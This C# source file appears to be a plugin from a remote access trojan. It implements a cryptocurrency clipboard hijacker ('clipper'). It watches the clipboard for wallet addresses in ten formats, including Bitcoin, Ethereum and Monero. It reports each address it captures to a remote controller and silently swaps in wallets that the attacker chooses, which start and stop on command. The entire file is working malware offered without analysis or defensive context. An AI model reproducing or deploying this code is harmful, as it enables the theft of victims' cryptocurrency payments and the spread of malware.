using System;
using System.Text.RegularExpressions;
using System.Threading;
using Leb128;
using Plugin.Helper;

namespace Plugin;

internal class Packet
{
	public static string[] CryptoWallet;

	public static string[] type = new string[10] { "Btc", "Eth", "Stellar", "Litecoin", "Bitcoin Cash", "monero", "zcash", "doge", "dash", "tron" };

	public static string[] Pattern = new string[10] { "^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}$", "(?:^0x[a-fA-F0-9]{40}$)", "(?:^G[0-9a-zA-Z]{55}$)", "(?:^[LM3][a-km-zA-HJ-NP-Z1-9]{26,33}$)", "^((bitcoincash:)?(q|p)[a-z0-9]{41})", "(?:^4[0-9AB][1-9A-HJ-NP-Za-km-z]{93}$)", "t1[0-9A-z]{33}", "D[A-Z1-9][1-9A-z]{32}", "(?:^X[1-9A-HJ-NP-Za-km-z]{33}$)", "T[A-Za-z1-9]{33}" };

	public static CancellationTokenSource ctsClipboard;

	public static void Loop()
	{
		try
		{
			ctsClipboard = new CancellationTokenSource();
			string text = "";
			while (!ctsClipboard.IsCancellationRequested)
			{
				string text2 = Clipboard.GetText();
				for (int i = 0; i < Pattern.Length; i++)
				{
					if (!new Regex(Pattern[i]).Match(text2).Success)
					{
						continue;
					}
					if (text2 != CryptoWallet[i] || "null" != CryptoWallet[i])
					{
						if (text != text2)
						{
							Client.Send(LEB128.Write(new object[4]
							{
								"Clipper",
								"Log",
								type[i],
								text2
							}));
							text = text2;
						}
						Clipboard.SetText(CryptoWallet[i]);
					}
					break;
				}
				Thread.Sleep(1000);
			}
		}
		catch (Exception ex)
		{
			Client.Send(LEB128.Write(new object[3]
			{
				"Logs",
				"Red",
				"Error Clipboard: " + ex.ToString()
			}));
		}
	}

	public static void Read(byte[] Messages)
	{
		try
		{
			object[] array = LEB128.Read(Messages);
			string text = (string)array[0];
			if (!(text == "Start"))
			{
				if (text == "Stop")
				{
					ctsClipboard.Cancel();
				}
				return;
			}
			CryptoWallet = ((string)array[1]).Split(new char[1] { ',' });
			new Thread((ThreadStart)delegate
			{
				Loop();
			}).Start();
		}
		catch (Exception ex)
		{
			Console.WriteLine(ex.ToString());
		}
	}
}
